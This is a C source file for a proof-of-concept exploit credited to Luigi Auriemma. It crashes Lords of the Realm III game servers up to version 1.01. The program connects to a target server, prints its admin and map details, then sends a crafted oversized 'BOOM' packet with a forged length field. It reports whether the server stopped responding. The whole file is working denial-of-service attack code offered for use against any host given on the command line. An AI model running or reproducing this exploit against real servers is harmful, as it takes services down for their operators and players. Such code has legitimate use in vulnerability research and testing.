/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netdb.h>
    #include <netinet/in.h>
#endif



#define VER     "0.1"
#define PORT    29901
#define BUFFSZ  16384   // BOOMSZ

#define SHOW(x) len = *(u_long *)p; \
                fputs(x, stdout); \
                p += 4; \
                while(len--) { \
                    fputc(*p, stdout); \
                    p += 2; \
                } \
                fputc('\n', stdout);



u_long resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in     peer;
    int     sd,
            len;
    u_short port = PORT;
    u_char  buff[BUFFSZ],
            *p;


    setbuf(stdout, NULL);

    fputs("\n"
        "Lords of the Realm III <= 1.01 server crash "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@altervista.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <server> [port(%d)]\n"
            "\n", argv[0], PORT);
        exit(1);
    }

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    if(argc > 2) port = atoi(argv[2]);

    peer.sin_addr.s_addr = resolv(argv[1]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd < 0) std_err();

    printf("- target   %s:%hu\n",
        inet_ntoa(peer.sin_addr), port);
    if(connect(sd, (struct sockaddr *)&peer, sizeof(peer))
      < 0) std_err();

    if(recv(sd, buff, BUFFSZ, 0)
      < 0) std_err();

    fputs("- informations:\n", stdout);
    if(*buff != 11) {
        p = buff + 5;
        SHOW("  Server*Admin:   ");
        p += 2;
        SHOW("  Map:            ");
    } else {
        p = buff + 24;
        SHOW("  Admin nick:     ");
    }

    *(u_long *)buff = BUFFSZ - 4;
    memcpy(buff + 4, "\x79\xff\xff\xff\xff", 5);
    *(u_long *)(buff + 9) = (BUFFSZ - 14) >> 1;
    memset(buff + 13, 'a', BUFFSZ - 14);
    buff[BUFFSZ - 1] = 0x45;

    fputs("\n- send BOOM data\n", stdout);
    if(send(sd, buff, BUFFSZ, 0)
      < 0) std_err();

    if(recv(sd, buff, BUFFSZ, 0) < 0) {
        fputs("\nServer IS vulnerable!!!\n\n", stdout);
    } else {
        fputs("\nServer doesn't seem to be vulnerable\n\n", stdout);
    }

    close(sd);
    return(0);
}



u_long resolv(char *host) {
    struct  hostent *hp;
    u_long  host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolve hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_long *)(hp->h_addr);
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif

